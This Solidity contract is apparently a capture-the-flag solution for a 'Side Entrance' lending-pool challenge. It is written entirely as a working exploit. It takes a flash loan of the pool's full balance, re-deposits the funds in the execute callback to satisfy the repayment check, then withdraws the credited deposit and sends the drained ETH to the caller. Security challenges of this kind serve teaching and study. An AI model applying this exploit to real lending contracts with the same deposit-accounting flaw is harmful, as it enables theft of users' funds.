// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;

    constructor(address payable poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function attack() external {
        // 1. Get a flash loan for all the eth stored in the contract 
        // 2. Deposit the amount to the contract in the callback function
        // 3. Then withdraw all the funds
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
    fallback() external payable {}
}
